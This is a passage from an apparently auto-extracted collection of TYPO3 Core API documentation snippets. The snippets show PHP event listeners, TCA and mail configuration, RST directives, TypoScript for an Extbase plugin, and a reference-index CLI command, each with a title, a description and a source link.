https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin.rst#2025-04-16_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n..  _Crowdin: https://crowdin.com/\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyImageManipulationPreviewUrlEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for ModifyImageManipulationPreviewUrlEvent that modifies the preview URL for image manipulation elements. The event listener demonstrates how to set a custom preview URL based on file properties and configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyImageManipulationPreviewUrlEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Form\\Event\\ModifyImageManipulationPreviewUrlEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyImageManipulationPreviewUrlEvent $event): void\n    {\n        // Only set preview URL for specific tables and fields\n        if ($event->getTable() !== 'sys_file_reference'\n            || $event->getField() !== 'crop'\n        ) {\n            return;\n        }\n\n        $file = $event->getFile();\n        if ($file === null) {\n            return;\n        }\n\n        // Set preview URL based on custom logic\n        $previewUrl = sprintf(\n            'https://example.org/preview/%d',\n            $file->getUid()\n        );\n        $event->setPreviewUrl($previewUrl);\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: PHP SetCollector Constructor\nDESCRIPTION: Example of SetCollector dependency injection in a constructor using Autowire annotation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\npublic function __construct(\n    #[Autowire(lazy: true)]\n    protected SetCollector $setCollector,\n) {}\n```\n\n----------------------------------------\n\nTITLE: Implementing GitHub Link Handler in TYPO3 CMS\nDESCRIPTION: A PHP class that implements LinkHandlerInterface to handle GitHub-specific links. The class loads a JavaScript module and renders a view template with GitHub-related configuration and link parts. It processes server requests and returns rendered HTML for the link browser.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/_CustomLinkBrowser/_GitHubLinkHandlerRender.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ServerRequestInterface;\n\nclass GitHubLinkHandler implements LinkHandlerInterface\n{\n    public function render(ServerRequestInterface $request): string\n    {\n        $this->pageRenderer->loadJavaScriptModule('@t3docs/examples/github_link_handler.js');\n        $this->view->assign('project', $this->configuration['project']);\n        $this->view->assign('action', $this->configuration['action']);\n        $this->view->assign('linkParts', $this->linkParts);\n        $this->view->assign('issue', $this->linkParts['issue'] ?? '');\n\n        return $this->view->render('LinkBrowser/GitHub');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: RST Image Reference for TYPO3 File Mount\nDESCRIPTION: ReStructuredText code for displaying a screenshot of file mount creation in TYPO3 CMS. The image shows configuration for a file mount pointing to the user_upload directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AccessControl/CreateFilemount.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AccessControl/CreateFilemount.png\n   :class: with-shadow\n\n   A file mount pointing to the \"user_upload\" directory\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Domain - TYPO3 PHP\nDESCRIPTION: This snippet sets the SMTP domain required by some servers for sending emails. This domain can be configured in the settings file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_domain'] = '';\n```\n\n----------------------------------------\n\nTITLE: Configuring the Title Field in TYPO3 TCA\nDESCRIPTION: This snippet defines the TCA configuration for the title field of a tea record. It specifies how the field appears in the backend form, including label, input type, and validation rules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Model.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'title' => [\n    'exclude' => false,\n    'label' => 'LLL:EXT:tea/Resources/Private/Language/locallang_db.xlf:tx_tea_domain_model_tea.title',\n    'config' => [\n        'type' => 'input',\n        'size' => 40,\n        'eval' => 'trim,required',\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Handling JavaScript Events in TYPO3 CMS - JavaScript\nDESCRIPTION: This snippet shows the JavaScript code needed to manage custom events in the TYPO3 User Settings module. It requires a static JavaScript module to handle events declared in the eventName options. This can be injected using the AddJavaScriptModulesEvent of PSR-14.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/UserSettingsConfiguration/Extending.rst#2025-04-16_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n..  literalinclude:: _event.js\n    :language: js\n```\n\n----------------------------------------\n\nTITLE: Accessing Record UIDs in PHP\nDESCRIPTION: Demonstrates how to access the unique identifiers of records in TYPO3. The uid property holds the record's ID, while _localizedUid contains the ID of the translated version when working with translations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\nuid\n```\n\nLANGUAGE: php\nCODE:\n```\n_localizedUid\n```\n\nLANGUAGE: php\nCODE:\n```\n_versionedUid\n```\n\n----------------------------------------\n\nTITLE: RST Table of Contents Tree\nDESCRIPTION: RST directive for creating a table of contents with specific pages about Crowdin integration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin.rst#2025-04-16_snippet_3\n\nLANGUAGE: rst\nCODE:\n```\n..  toctree::\n    :titlesonly:\n\n    Crowdin/ExtensionIntegration\n    Crowdin/OnlineTranslation\n    Crowdin/Workflow\n    Crowdin/Faq\n```\n\n----------------------------------------\n\nTITLE: Correct Function Return Path\nDESCRIPTION: Demonstrates the proper way to ensure all code paths return a value in a type-hinted function\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_27\n\nLANGUAGE: php\nCODE:\n```\nfunction extendedUse(bool $enabled): string\n{\n   $content = '';\n   if ($enabled) {\n       $content = 'Extended use';\n   }\n   return $content;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforeLoadedUserTsConfigEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for BeforeLoadedUserTsConfigEvent that adds static user TSconfig. The configuration should not depend on runtime or request state.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/TypoScript/BeforeLoadedUserTsConfigEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\TypoScript\\EventListener;\n\nuse TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event\\BeforeLoadedUserTsConfigEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeLoadedUserTsConfigEvent $event): void\n    {\n        $event->addUserTsConfig('\n            options.pageTree.showPageIdWithTitle = 1\n        ');\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for TYPO3 Clipboard Screenshot\nDESCRIPTION: ReStructuredText directive for embedding and styling a screenshot of the TYPO3 backend clipboard with shadow effect and caption.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/Clipboard/ClipboardContent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/Clipboard/ClipboardContent.png\n   :class: with-shadow\n\n   The clipboard as seen in the backend\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for TYPO3 Flash Message Screenshot\nDESCRIPTION: reStructuredText directive showing a screenshot of a TYPO3 success message display in a module interface with shadow styling\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/FlashMessages/FlashMessagesExample.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/FlashMessages/FlashMessagesExample.png\n   :class: with-shadow\n\n   A typical (success) message shown at the top of a module\n```\n\n----------------------------------------\n\nTITLE: Creating Table of Contents for Request Attributes Subdocuments\nDESCRIPTION: Sets up a table of contents directive that will include all child documents at a maximum depth of 1 level, using globbing to match all files in the current directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: rst\nCODE:\n```\n..  toctree::\n    :maxdepth: 1\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Registering New Content Element Group in PHP\nDESCRIPTION: Demonstrates how to register a new group in the New Content Element wizard using PHP in the TCA overrides file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/ContentElementsWizard.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TCA']['tt_content']['columns']['CType']['config']['itemGroups']['my_group'] = 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:my_group';\n```\n\n----------------------------------------\n\nTITLE: Adding Static Files in TYPO3\nDESCRIPTION: This code demonstrates how to register TypoScript files using the ExtensionManagementUtility's addStaticFile method within the TYPO3 context. This is critical for including TypoScript records effectively.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/TypoScript/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n.. literalinclude:: _snippets/_sys_template.php\n   :caption: EXT:my_extension/Configuration/TCA/Overrides/sys_template.php\n```\n\n----------------------------------------\n\nTITLE: getByIsoCode() Method\nDESCRIPTION: This method retrieves a country based on its ISO code. It takes an ISO code as a string parameter and returns a `Country` object or null if no country matches the provided ISO code.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Country/CountryProvider.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: getByIsoCode(string $isoCode)\n        :returns: `?\\TYPO3\\CMS\\Core\\Country\\Country`\n\n        :param $isoCode: the isoCode\n```\n\n----------------------------------------\n\nTITLE: Including RST Documentation Structure\nDESCRIPTION: RST directives for including shared content and defining document structure with toctree for RTE transformation documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/HistoricalRteTransformations/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n\n.. _appendices:\n.. _appendix-a:\n\n=============================================\nHistorical Perspective on RTE Transformations\n=============================================\n\n.. toctree::\n   :titlesonly:\n\n   PropertiesAndTransformations\n   RteTransformationsInContentElements\n```\n\n----------------------------------------\n\nTITLE: Defining FilterMenuItemsEvent Class in TYPO3 CMS Frontend\nDESCRIPTION: This code snippet defines the FilterMenuItemsEvent class in the TYPO3\\CMS\\Frontend\\Event namespace. It includes method signatures for manipulating menu items, configurations, and retrieving context information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/FilterMenuItemsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass FilterMenuItemsEvent\n{\n    public function getAllMenuItems(): array {}\n    public function getFilteredMenuItems(): array {}\n    public function setFilteredMenuItems(array $filteredMenuItems) {}\n    public function getMenuConfiguration(): array {}\n    public function getItemConfiguration(): array {}\n    public function getBannedMenuItems(): array {}\n    public function getExcludedDoktypes(): array {}\n    public function getSite(): \\TYPO3\\CMS\\Core\\Site\\Entity\\Site {}\n    public function getContext(): \\TYPO3\\CMS\\Core\\Context\\Context {}\n    public function getCurrentPage(): array {}\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing BackendUser in Symfony Command (PHP)\nDESCRIPTION: Shows how to initialize the backend authentication for using DataHandler in a Symfony command context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/UsingDataHandler/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Core\\Bootstrap::initializeBackendAuthentication();\n```\n\n----------------------------------------\n\nTITLE: Additional RST Includes\nDESCRIPTION: Including additional documentation files for events contribution notes and code snippets\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterFormEnginePageInitializedEvent.rst#2025-04-16_snippet_3\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /_includes/EventsContributeNote.rst.txt\n```\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /CodeSnippets/Events/Backend/AfterFormEnginePageInitializedEvent.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Updating Reference Index via CLI in Legacy TYPO3 Installation\nDESCRIPTION: This command updates the reference index for a legacy TYPO3 installation. It should be executed in the root folder of the project. This method is recommended to avoid timeouts, especially on larger instances.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/PreupgradeTasks/ReferenceIndex.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 referenceindex:update\n```\n\n----------------------------------------\n\nTITLE: Displaying Extbase Plugin using TypoScript\nDESCRIPTION: The TypoScript snippet defines how to display the configured Extbase frontend plugin using TypoScript. It specifies the use of an EXTBASEPLUGIN object to render the RSS feed on a special page type, mapped through TypoScript at `tt_content.blogexample_postlistrss`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FrontendPlugins.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_blogexample {\n  settings {\n    rssFeed = 1\n  }\n}\n\npage {\n  typeNum = 0\n\n  10 = USER\n  10 {\n    userFunc = TYPO3\\CMS\\Extbase\\Core\\Bootstrap->run\n    extensionName = BlogExample\n    pluginName = PostListRss\n    vendorName = TYPO3\\CMS\n  }\n}\n\n[globalVar = TSFE:id = 1]\npage {\n  typeNum = 5\n}\n[global]\n```\n\n----------------------------------------\n\nTITLE: Defining Card Grid for TYPO3 Upgrade Topics in reStructuredText\nDESCRIPTION: This code snippet defines a card grid layout in reStructuredText to present various TYPO3 upgrade topics. It includes cards for patch updates, major upgrades, extension upgrades, third-party tools, legacy upgrades, applying core patches, migrating to Composer, and migrating content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  card-grid::\n    :columns: 1\n    :columns-md: 2\n    :gap: 4\n    :class: pb-4\n    :card-height: 100\n\n    ..  card:: :ref:`Patch/bugfix updates <Minor>`\n\n        Patch/bugfix updates contain bugfixes and/or security updates. This section details\n        how to install them using Composer.\n\n    ..  card:: :ref:`Major upgrades <Major>`\n\n        This chapter details how major upgrades are installed using Composer and\n        highlights what tasks need to be carried out before and after the core is updated.\n\n    ..  card:: :ref:`Upgrading extensions <UpgradingExtensions>`\n\n        Just like TYPO3's core, extensions also need to be regularly updated.\n        This chapter details how to upgrade extensions using Composer.\n\n    ..  card:: :ref:`Third-party Tools <Tools>`\n\n        Tools and resources developed by the community that can assist with common\n        upgrade and maintenance tasks.\n\n    ..  card:: :ref:`Legacy upgrade guide <Legacy>`\n\n        Using TYPO3 without Composer? This chapter details how to upgrade TYPO3 manually.\n\n    ..  card:: :ref:`Applying Core patches <applying-core-patches>`\n\n        Learn how to apply Core patches in a future proof way: Automatize\n        patch application with `cweagans/composer-patches`. Download\n        a patch for the Core.\n\n    ..  card:: :ref:`Migrate a TYPO3 installation to Composer <MigrateToComposer>`\n\n        Information on how to migrate a legacy installation of TYPO3 to a Composer based installation.\n\n    ..  card:: :ref:`Migrate content <MigrateContent>`\n\n        This chapter details how pages and content can be exported and then imported into another installation of TYPO3.\n```\n\n----------------------------------------\n\nTITLE: Defining Blog Model Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines a Blog class that extends AbstractEntity in TYPO3 CMS. It includes a public string property 'description' to store a short description of the blog. This class is part of the T3docs\\BlogExample\\Domain\\Model namespace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Annotation/Validate.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Blog extends AbstractEntity\n{\n    /**\n     * A short description of the blog\n     */\n    public string $description = '';\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing AdminModuleController with Dependency Injection in TYPO3 CMS\nDESCRIPTION: This code snippet defines a final readonly controller class with constructor dependency injection. It injects the ModuleTemplateFactory, IconFactory, and UriBuilder services which are essential for TYPO3 backend module implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/_ModuleConfiguration/_AdminModuleControllerConstruct.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Backend\\Routing\\UriBuilder;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplateFactory;\nuse TYPO3\\CMS\\Core\\Imaging\\IconFactory;\n\nfinal readonly class AdminModuleController\n{\n    public function __construct(\n        private ModuleTemplateFactory $moduleTemplateFactory,\n        private IconFactory $iconFactory,\n        private UriBuilder $uriBuilder,\n        // ...\n    ) {}\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Deprecation Logging in TYPO3 PHP Settings\nDESCRIPTION: This snippet shows how to enable or disable deprecation logging in TYPO3's settings.php file. The 'disabled' option is set to false to enable logging.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Deprecation/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['TYPO3']['CMS']['deprecations']['writerConfiguration'] = [\n    // Note: This is the default setting\n    'notice' => [\n        'TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter' => [\n            'disabled' => false\n        ]\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Creating a Hook with makeInstance in TYPO3 Extension\nDESCRIPTION: Example of creating a hook using GeneralUtility::makeInstance() for data submission to extensions. This demonstrates how to implement a hook that processes an array of submitted records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Hooks/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nfunction processData($table, $data)\n{\n    // Hook for post-processing the submitted data:\n    if ($hookObjectsArr = $GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['my_extension']['processData'] ?? false) {\n        foreach ($hookObjectsArr as $hookObj) {\n            $hookObj = GeneralUtility::makeInstance($hookObj);\n            if (method_exists($hookObj, 'processDataSubmission')) {\n                $hookObj->processDataSubmission($table, $data, $this);\n            }\n        }\n    }\n}\n```"
  }
]